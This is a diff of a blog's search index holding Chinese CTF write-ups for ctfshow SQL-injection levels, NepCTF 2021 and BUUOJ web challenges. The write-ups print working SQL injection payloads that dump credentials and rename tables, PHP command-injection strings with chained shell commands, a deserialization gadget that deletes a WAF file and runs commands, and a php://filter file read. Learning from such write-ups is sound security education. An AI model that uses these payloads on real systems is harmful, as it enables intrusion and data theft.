+<p><img src="https://img-blog.csdnimg.cn/20210209003048217.png">接着查询表名</p>
+<blockquote>
+<p>-1” ‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2021020900314130.png"><br>然后查询表中的数据，先查询ctfshow_user</p>
+<blockquote>
+<p>-1” ‘ union select id,username,password from ctfshow_user –+</p>
+</blockquote>
+<p>发现flag不在这里</p>
+<p><img src="https://img-blog.csdnimg.cn/20210209003423518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后查询ctfshow_user2</p>
+<blockquote>
+<p>-1” ‘ union select id,username,password from ctfshow_user2 –+</p>
+</blockquote>
+<p>发现flag<br><img src="https://img-blog.csdnimg.cn/2021020900351314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="sql173"><a href="#sql173" class="headerlink" title="sql173"></a>sql173</h1><p>根据题目给出的查询语句和返回逻辑发现，题目对id,username,password都进行了正则匹配<br>查询资料发现可以通过hex绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, json_encode(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<blockquote>
+<p>-1” ‘ union select hex(id),hex(username),hex(password) from ctfshow_user3 where username=’flag’ –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210209005644675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>将获取的结果进行十六进制解码可以得到flag<br><img src="https://img-blog.csdnimg.cn/2021020900572493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -455,91 +407,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CTFshow web入门 sql</title>
-    <url>/2021/02/09/web/sql/CTF%20show%20web%E5%85%A5%E9%97%A8%20sql/</url>
-    <content><![CDATA[<p>CTFshow web入门 sql注入</p>
-<a id="more"></a>
-<h1 id="sql171"><a href="#sql171" class="headerlink" title="sql171"></a>sql171</h1><p>已给出提示：</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
-<p>首先判断注入点</p>
-</blockquote>
-<blockquote>
-<p>id=1’ and 1=1</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/14a98fd34b12ede5b79837c8cb71cee6.png" alt="1"></p>
-<p>没报错也没有显示任何信息，将1=1改为1=2</p>
-<blockquote>
-<p>id=1’ and 1=2</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/6618d1687fc6391b7fab913fa7304d6f.png" alt="2"></p>
-<p>还是没有显示任何信息，说明可以使用 ‘ 字符注入</p>
-<p>然后开始判断表有多少列</p>
-<blockquote>
-<p>id=1’ order by 1,2,3 –+</p>
-</blockquote>
-<p>没反应</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/baa7fb6b509789bd13a55341b5ed2ead.png" alt="3"></p>
-<blockquote>
-<p>id=1’ order by 1,2,3,4 –+</p>
-</blockquote>
-<p>出现异常，说明只有三列</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/395e1e2c8fdbcc279cb5cdd97dc5fff3.png" alt="4"></p>
-<p>查询用户，数据库</p>
-<blockquote>
-<p>id=1’ union select 1,user(),database() –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/c082ec58008ebb62f2ad28c500341d79.png" alt="5"></p>
-<p>查询该数据库下有哪些表</p>
-<blockquote>
-<p>id=1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’ctfshow_web’),3 –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/44d780e1a497be20a272bf6ad71e0a67.png" alt="6"></p>
-<p>知道表名就可以查询表里的内容了</p>
-<blockquote>
-<p>id=1’ union select id,username,password from ctfshow_user –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/c4aac8c93bb0e44d7dcd3cc474e7da1a.png" alt="7"></p>
-<p>w_user –+</p>
-<p>[外链图片转存中…(img-4ECGGwnL-1612801653075)]</p>
-<p>拿到flag</p>
-<h1 id="sql172"><a href="#sql172" class="headerlink" title="sql172"></a>sql172</h1><p>进入题目后已给出查询语句</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>于是根据查询语句构造payload</p>
-<blockquote>
-<p>-1” ‘ union select 1,2,3 –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210209003048217.png">接着查询表名</p>
-<blockquote>
-<p>-1” ‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3 –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/2021020900314130.png"><br>然后查询表中的数据，先查询ctfshow_user</p>
-<blockquote>
-<p>-1” ‘ union select id,username,password from ctfshow_user –+</p>
-</blockquote>
-<p>发现flag不在这里</p>
-<p><img src="https://img-blog.csdnimg.cn/20210209003423518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后查询ctfshow_user2</p>
-<blockquote>
-<p>-1” ‘ union select id,username,password from ctfshow_user2 –+</p>
-</blockquote>
-<p>发现flag<br><img src="https://img-blog.csdnimg.cn/2021020900351314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<h1 id="sql173"><a href="#sql173" class="headerlink" title="sql173"></a>sql173</h1><p>根据题目给出的查询语句和返回逻辑发现，题目对id,username,password都进行了正则匹配<br>查询资料发现可以通过hex绕过</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, json_encode(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>payload</p>
-<blockquote>
-<p>-1” ‘ union select hex(id),hex(username),hex(password) from ctfshow_user3 where username=’flag’ –+</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210209005644675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>将获取的结果进行十六进制解码可以得到flag<br><img src="https://img-blog.csdnimg.cn/2021020900572493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-]]></content>
-      <categories>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入基本语句</title>
     <url>/2021/02/05/web/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5/</url>
     <content><![CDATA[<h1 id="sql注入基本语句"><a href="#sql注入基本语句" class="headerlink" title="sql注入基本语句"></a>sql注入基本语句</h1><a id="more"></a>
@@ -548,8 +415,8 @@
         <category>sql注入</category>
       </categories>
       <tags>
-        <tag>mysql</tag>
         <tag>sql注入</tag>
+        <tag>mysql</tag>
       </tags>
   </entry>
   <entry>
@@ -858,6 +725,223 @@
       <tags>
         <tag>sql注入</tag>
         <tag>sql-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>nep2021</title>
+    <url>/2021/03/24/web/WriteUp/nep2021/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><a id="more"></a>
+<p>对于本萌新来说，这次的nep比赛是非常好的一次历练机会（虽然web一道都没有写出来QAQ，但是之后复现后学到了很多新的姿势，相对来说还是有点提升的，嘿嘿。</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><p>打开题目后发现一串代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$nep</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    <span class="variable">$len</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$len</span>)&lt;<span class="number">8</span> &amp;&amp; strlen(<span class="variable">$nep</span>)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$nep</span>,<span class="number">0</span>,<span class="variable">$len</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>算是第一次遇到trick题吧，找了找度娘知道可以利用<strong>php的反引号执行系统命令</strong> 的特性</p>
+<h4 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h4><p>tips：这个解法需要开两次靶机，第一次查看文件目录，第二次cat</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url/?nep=`ls&gt;<span class="number">1</span>`&amp;len=<span class="number">7</span></span><br></pre></td></tr></table></figure>
+<p>可以得到</p>
+<p><img src="https://i.loli.net/2021/03/23/hSQWDe2IVbiFzGH.png"></p>
+<p>然后再开一次靶机</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url/?nep=`&gt;cat`;&amp;len=<span class="number">7</span></span><br><span class="line">url/?nep=`*&gt;<span class="number">1</span>`;&amp;len=<span class="number">7</span></span><br><span class="line">在这里*&gt;<span class="number">1</span>相当于cat index.php nepctf.php&gt; <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>最后得到flag</p>
+<blockquote>
+<p>NepCTF{n3pn3p_l1ttle_tr1ck_c0me_bAck}</p>
+</blockquote>
+<h4 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url/?nep=`<span class="variable">$len</span>`;&amp;len=<span class="number">7</span> || ls&gt;<span class="number">1</span></span><br><span class="line">url/?nep=`<span class="variable">$len</span>`;&amp;len=<span class="number">7</span> || cat nepctf.php&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>由于intval()函数的特性，会在遇到第一个非数字字符时停止截取，而nep参数中运用反引号``调用len参数</p>
+<p>由于len=7 || cat nepctf.php&gt;1在linux中运行可知7不是一个命令，所以会执行||（或）之后的另一个命令</p>
+<p>即</p>
+<p><img src="https://i.loli.net/2021/03/23/itKIN7fSxoB8Ub6.png"></p>
+<h3 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h3><p>进入题目后看见一串特长的代码，先来简单审计一下</p>
+<p>首先是Game类，里面有<code>wakeup</code>和<code>destruct</code>方法，<code>wakeup</code>里还有一个<code>21232f297a57a5a743894a0e4a801fc3</code>在线解码后是<code>admin</code></p>
+<p>简单分析了一下，咱可以知道应该是要调用Open类里的<code>shell($content);</code>来进行任意命令的执行，但是由于<code>waf.txt</code>的存在，咱只能调用file_get_contents()</p>
+<p>先看看shell.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+<p>发现挺多命令也被ban了</p>
+<p><img src="https://i.loli.net/2021/03/23/RFHKUXqhJju12sN.png"></p>
+<p>但这先放一边，先看看怎么删除掉<code>waf.txt</code>文件，不然连命令都输不进去_(:з」∠)_</p>
+<p>之前的代码审计咱可以知道，login类中的checking方法里有个<code>$this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);</code>这行代码</p>
+<p>找找带有open()方法，而且还能删除文件的php原生类</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>)&#123;</span><br><span class="line">    <span class="variable">$methods</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;open&#x27;</span></span><br><span class="line">        )))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$class</span>.<span class="string">&quot;::&quot;</span>.<span class="variable">$method</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单测试一下，发现ZipArchive()刚好可以把<code>waf.txt</code>删除</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+<p>然后就可以随意命令执行辣</p>
+<p>tips：很多查看命令被ban了，但是还可以使用<code>php /flag</code>绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>打开附件看到一串16进制字符串，放到cyberchef里转一转</p>
+<p><img src="https://i.loli.net/2021/03/23/utHhbQYmrPwe8JE.png"></p>
+<p>把剩下的复制到sublime text</p>
+<p><img src="https://i.loli.net/2021/03/23/oHuLIRyTnXF7MSa.png" alt="image-20210323171836395"></p>
+<p>看起来有点扁，放到画图软件里拉宽一下</p>
+<p><img src="https://i.loli.net/2021/03/23/Hnav8yB4hPeTJQV.png" alt="image-20210323171933445"></p>
+<p>可以清晰的看到flag</p>
+<blockquote>
+<p>Nep{Y0u_ar3_50_cl3ver!}</p>
+</blockquote>
+<h3 id="我是间谍2nd"><a href="#我是间谍2nd" class="headerlink" title="我是间谍2nd"></a>我是间谍2nd</h3><p>下载的附件直接打开显示出了一句话</p>
+<p>**connecting to 223.223.223.223:6001 **</p>
+<p>那咱就修改一下ip为223.223.223.223</p>
+<p><img src="https://i.loli.net/2021/03/20/y8eCNGzUJhRFmVZ.png"></p>
+<p>然后用netcat开监听，并运行文件</p>
+<blockquote>
+<p>nc -lvvp 6001</p>
+</blockquote>
+<p>发现有回响</p>
+<p><img src="https://i.loli.net/2021/03/20/I7VFOUe6XrJZoc4.png"></p>
+<p>连接可得到flag</p>
+<blockquote>
+<p>Nep{XVlBzgbaiCMRAjWwhTHctcuAxhxKQFDaFpLSjFbcXoEF}</p>
+</blockquote>
+<h3 id="出题人日记"><a href="#出题人日记" class="headerlink" title="出题人日记"></a>出题人日记</h3><p>打开附件后解压压缩包内容，发现是个.xlsx文件，拿010打开后查看文件头可以知道其实是一个.zip压缩文件</p>
+<p>更改文件扩展名后解压缩</p>
+<p>tips：这里打开压缩包的时候是有一个hint的，但是不能拿默认的解压缩软件打开，不然看不到备注</p>
+<p><img src="https://i.loli.net/2021/03/24/xaPKZA3yI7kGT8v.png"></p>
+<p>发现这个hint还被编码过了，拿去cyberchef解码一下</p>
+<p><img src="https://i.loli.net/2021/03/24/pyd5CD7FhtfI68u.png"></p>
+<p>然后去google直接搜索Steganography.js</p>
+<p><a href="https://www.peter-eigenschink.at/projects/steganographyjs/showcase/">https://www.peter-eigenschink.at/projects/steganographyjs/showcase/</a></p>
+<p>然后直接在王章内解密就可以得到flag了</p>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Nepnep</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUOJ-Web</title>
+    <url>/2021/03/11/web/WriteUp/BUUOJ%20web/</url>
+    <content><![CDATA[<p>BUUOJ-Web WriteUp</p>
+<a id="more"></a>
+<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>简单的sql注入</p>
+<p>这里是payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p>可以登陆进去之后直接看到flag</p>
+<p><img src="https://i.loli.net/2021/03/11/4BYLC9cDZv7ztT2.png"></p>
+<blockquote>
+<p>flag{2c793226-369d-4941-af62-10463af21b6c}</p>
+</blockquote>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>尝试了各种姿势后发现可以用堆叠注入</p>
+<p>爆库名</p>
+<blockquote>
+<p>1’;show databases;#</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/03/11/oBOT9y7iNzrgacA.png"></p>
+<p>爆表名</p>
+<blockquote>
+<p>1’;show tables;#</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/03/11/A7j2dthgLny8iQC.png"></p>
+<p>爆列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;# #爆1919810931114514表</span><br><span class="line">1&#39;;show columns from &#96;words&#96;;# #爆words表</span><br></pre></td></tr></table></figure>
+<p>发现id在words表中，那么咱只需要改个表名就行了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;; # 把表words更名为words1</span><br><span class="line">rename tables &#96;1919810931114514&#96; to &#96;words&#96;; # 把表1919810931114514更名为words</span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100); # 把words中的列名flag更名为id</span><br></pre></td></tr></table></figure>
+<p>然后只要登入就可以看到flag了</p>
+<blockquote>
+<p>1’ or 1=1 #</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/03/11/S1cdzKsJLBnDA5P.png"></p>
+<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开看见一只可爱的小猫</p>
+<p>直接进入ctrl + U看源代码，在下面发现藏东西了</p>
+<p><img src="https://i.loli.net/2021/03/11/pYXv52zRePSgiOu.png"></p>
+<p>按着GET一个cat变量，出现flag</p>
+<p><img src="https://i.loli.net/2021/03/11/4sCJkcIQWBzdv9p.png"></p>
+<blockquote>
+<p>flag{04dfe2f2-bbf0-43f3-9bf1-faab0790de78}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>ctrl+U发现一个Archive_room.php</p>
+<p>用burpsuite抓一下包，发现一个secr3t.php</p>
+<p><img src="https://i.loli.net/2021/03/13/2pXDMTH8ZsvziE4.png"></p>
+<p>发现是一段简单的代码审计和文件包含</p>
+<p>咱可以用伪协议</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/03/13/gCqDYKie7H3RVP2.png"></p>
+<p>得到一串base64编码，解码即可得到flag</p>
+<blockquote>
+<p>flag{d67ab513-7a2d-4e45-a27a-99486f6f99ee}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>进去后发现是简单的sql注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select 1,2,3 # # 查看回显</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 # #爆表名</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;),3 # # 爆列名</span><br><span class="line">-1&#39; union select 1,(select group_concat(concat_ws(0x7e, username, password)) from l0ve1ysq1),3 # #爆数据</span><br></pre></td></tr></table></figure>
+<p>最后得到flag</p>
+<blockquote>
+<p>flag{94e175f4-807f-404e-a433-65501ae8595b}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>这题提示已经POST了一个一句话木马</p>
+<p>直接用蚁剑连接</p>
+<p><img src="https://i.loli.net/2021/03/13/KYiDsjup9zoFG7b.png"></p>
+<p>  得到flag</p>
+<blockquote>
+<p>flag{46dce079-289a-4494-98da-139ce0e08a9a}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p> ctrl+U发现一个secret.php</p>
+<p>进入后依照提示逐一添加header</p>
